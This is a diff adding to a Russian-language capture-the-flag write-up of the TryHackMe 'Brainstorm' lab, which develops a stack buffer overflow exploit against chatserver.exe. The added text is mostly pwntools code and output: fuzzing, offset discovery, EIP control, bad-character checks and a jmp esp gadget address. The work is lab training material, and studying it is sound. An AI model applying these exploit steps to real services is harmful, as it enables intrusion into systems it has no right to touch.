@@ -285,7 +285,10 @@ va       true
 Из этого следует, что, возможно, инструкцию `call esp/jmp esp` для вызова кода из стека, нужно искать в `DLL`, где адреса точно постоянны.
 
 Запускаю `chatserver.exe` на Windows машине с `immunity debugger`
-Создаю рабочую директорию `!mona config -set workingfolder c:\mona\%p`
+Создаю рабочую директорию  
+```python
+!mona config -set workingfolder c:\mona\%p
+```
 <img width="1918" height="1016" alt="image" src="https://github.com/user-attachments/assets/c67671c4-bbcb-4fc6-ad44-81a2af470664" />
 
 Далее создаю шаблон с помощью `pwntool`
@@ -297,6 +300,299 @@ va       true
 └─$ pwn template ./chatserver.exe --quiet --host 192.168.56.124 --port 9999 > x.py 
 [*] Automatically detecting challenge binaries...
 ```
+
+После каждого введенного `Message`, приложение запрашивает новое, так что можно не переподключаться для фаззинга, а работать в одной сессии
+```python
+from pwn import *
+
+context.update(arch='i386')
+exe = './chatserver.exe'
+
+host = args.HOST or '192.168.56.124'
+port = int(args.PORT or 9999)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.EDB:
+        return process(['edb', '--run', exe] + argv, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+
+# ==================== LOCAL  CONSTANTS =====================
+USERNAME = b'--pentest'
+# ==================== OPTIMIZED FUZZER =====================
+def run_fuzzer():
+    io = start()
+
+    print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
+    io.sendline(USERNAME)
+    print(USERNAME)
+    print(io.recvuntil(b'Write a message: ').decode('utf-8'))
+
+    pattern = cyclic(5000)  # Generate smart pattern
+    chunk_size = 100
+    max_size = 5000
+    timeout = 2
+
+    for i in range(0, max_size, chunk_size):
+        try:
+            current_payload = pattern[:i]
+            log.info(f"Sending {len(current_payload)} bytes")
+            io.sendline(current_payload)
+            response = io.recv(timeout=timeout)
+            if not response:
+                log.success(f"Server stopped responding at [{i}] bytes")
+                break
+            if b'Write a message:' not in response:
+                log.success(f"Unexpected response at [{i}] bytes")
+                break
+        except EOFError:
+            log.success(f"Server crashed at ~[{i}] bytes")
+            break
+        except Exception as e:
+            log.warning(f"Error at [{i}] bytes: {str(e)}")
+            break
+
+    # Try to interact if crash detected
+    try:
+        io.interactive()
+    except:
+        pass
+
+# ==================== MAIN =====================
+if __name__ == '__main__':
+    run_fuzzer()
+```
+
+Приложение крашится при отправке 2100 байт
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ python3 x.py
+[+] Opening connection to 192.168.56.124 on port 9999: Done
+Welcome to Brainstorm chat (beta)
+Please enter your username (max 20 characters): 
+b'--pentest'
+Write a message: 
+[*] Sending 0 bytes
+[*] Sending 100 bytes
+[*] Sending 200 bytes
+[*] Sending 300 bytes
+[*] Sending 400 bytes
+[*] Sending 500 bytes
+[*] Sending 600 bytes
+[*] Sending 700 bytes
+[*] Sending 800 bytes
+[*] Sending 900 bytes
+[*] Sending 1000 bytes
+[*] Sending 1100 bytes
+[*] Sending 1200 bytes
+[*] Sending 1300 bytes
+[*] Sending 1400 bytes
+[*] Sending 1500 bytes
+[*] Sending 1600 bytes
+[*] Sending 1700 bytes
+[*] Sending 1800 bytes
+[*] Sending 1900 bytes
+[*] Sending 2000 bytes
+[*] Sending 2100 bytes
+[+] Server stopped responding at [2100] bytes
+[*] Switching to interactive mode
+$  
+```
+
+Сразу смотрю стек и регистры  
+<img width="1918" height="975" alt="image" src="https://github.com/user-attachments/assets/546e0656-ee6e-4a88-8a1b-4ee0ba17030b" />  
+
+Добавляю в скрипт функцию `get_offset()` перед вызовом `__main__`  
+```python
+def get_offset():
+    eip_value = 0x75616164
+    offset = cyclic_find(p32(eip_value))
+    log.success(f"Offset: [{offset}] bytes")
+
+# ==================== MAIN =====================
+if __name__ == '__main__':
+    #run_fuzzer()
+    get_offset()
+```
+
+И снова запускаю скрипт
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ python3 x.py
+[+] Offset [2012] bytes
+```
+
+Теперь можно перейти к написанию кода эксплуатации.  
+Сперва нужно убедиться, что я контролирую `EIP` и `stack`  
+Добавляю в скрипт функцию `run_exploit()`  
+```python
+def run_exploit():
+    offset = 2012
+    junk   = b'A' * offset
+    EIP    = b'B' * 4
+    stack  = b'C' * 12
+
+    payload = b''.join([
+        junk,
+        EIP,
+        stack,
+    ])
+
+    try:
+        io = start()
+        print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
+        io.sendline(USERNAME)
+        print(USERNAME)
+        print(io.recvuntil(b'Write a message: ').decode('utf-8'))
+        io.sendline(payload)
+        try:
+            response = io.recv(timeout=RESPONSE_TIMEOUT)
+            if response:
+                log.warning(f"Server responded unexpectedly: {response[:100]}...")
+            else:
+                log.success("Server stopped responding - likely crashed!")
+        except EOFError:
+            log.success("Connection closed by server - likely crashed!")
+
+    except Exception as e:
+        log.error(f"Error during exploitation: {str(e)}")
+    finally:
+        try:
+            io.close()
+        except:
+            pass
+
+    log.info("Test completed. Check debugger for EIP value (should be 42424242).")
+
+# ==================== MAIN =====================
+if __name__ == '__main__':
+    run_exploit()
+```
+
+Перезапускаю отладку в дебаггере и запускаю скрипт  
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ python3 x.py
+[+] Opening connection to 192.168.56.124 on port 9999: Done
+Welcome to Brainstorm chat (beta)
+Please enter your username (max 20 characters): 
+b'--pentest'
+Write a message: 
+[+] Server stopped responding - likely crashed!
+[*] Closed connection to 192.168.56.124 port 9999
+[*] Test completed. Check debugger for EIP value (should be 42424242).
+```
+
+И убеждаюсь, что, действительно, контролирую `EIP` и `stack`
+<img width="1915" height="974" alt="image" src="https://github.com/user-attachments/assets/a0729223-ea6c-4310-b57c-40e5fcc2f3f9" />  
+
+Приступаю к нахождению бэдчаров.
+Генерирую в `immunity debugger` последовательность без нулевого байта  
+```python
+!mona bytearray -b "\x00"
+```
+
+Меняю функцию 
+```python
+def run_exploit():
+    offset = 2012
+    junk   = b'A' * offset
+    EIP    = b'B' * 4
+
+    exclude_list = ['\\x00']
+    stack = ''.join(f'\\x{x:02x}' for x in range(1, 256) if f'\\x{x:02x}' not in exclude_list)
+
+    payload = b''.join([
+        junk,
+        EIP,
+        stack.encode('latin-1'),
+    ])
+
+    try:
+        io = start()
+        print(io.recvuntil(b'Please enter your username (max 20 characters): ').decode('utf-8'))
+        io.sendline(USERNAME)
+        print(USERNAME)
+        print(io.recvuntil(b'Write a message: ').decode('utf-8'))
+        io.sendline(payload)
+        try:
+            response = io.recv(timeout=RESPONSE_TIMEOUT)
+            if response:
+                log.warning(f"Server responded unexpectedly: {response[:100]}...")
+            else:
+                log.success("Server stopped responding - likely crashed!")
+        except EOFError:
+            log.success("Connection closed by server - likely crashed!")
+
+    except Exception as e:
+        log.error(f"Error during exploitation: {str(e)}")
+    finally:
+        try:
+            io.close()
+        except:
+            pass
+
+    log.info('Test completed. Check debugger for ESP value')
+```
+
+Перезапускаю приложение в отладчике и запускаю скрипт
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ python3 x.py
+/home/kali/Labs/TryHackMe/Win Medium - Brainstorm/exploits/x.py:123: SyntaxWarning: invalid escape sequence '\m'
+  log.info('and run [!mona compare -f "c:\mona\brainpan\bytearray.bin" -a {esp_address}]')
+[+] Opening connection to 192.168.56.124 on port 9999: Done
+Welcome to Brainstorm chat (beta)
+Please enter your username (max 20 characters): 
+b'--pentest'
+Write a message: 
+[+] Server stopped responding - likely crashed!
+[*] Closed connection to 192.168.56.124 port 9999
+[*] Test completed. Check debugger for ESP value
+```
+<img width="1910" height="976" alt="image" src="https://github.com/user-attachments/assets/00a174e5-5af8-4e00-bb4a-3311ef2596ae" />  
+
+И смотрю таблицу  
+```python
+!mona compare -f "c:\mona\chatserver\bytearray.bin" -a 0204EEC0
+```
+<img width="376" height="325" alt="image" src="https://github.com/user-attachments/assets/ea9e90a6-6afa-46c4-ad45-db251f52155a" />
+Кроме `x00` бэдчаров нет.
+
+Далее нужно найти функцию для вызова кода из стека в `essfunc.dll`  
+Для этого использую `ROPgadget`  
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ ROPgadget --binary ./essfunc.dll > essfunc.allgadgets.txt
+                                                                                                                  
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ grep -iE "call esp" essfunc.allgadgets.txt | awk -F';' 'NF <= 2' 
+                                                                                                                  
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Brainstorm/exploits]
+└─$ grep -iE "jmp esp" essfunc.allgadgets.txt | awk -F';' 'NF <= 2'
+0x625014df : jmp esp
+0x625014dd : mov ebp, esp ; jmp esp
+```
+
+Теперь EIP в скрипте можно заменить на `EIP = 0x625014df`
 
 
 ![nmap scan](screenshots/nmap_scan.png)
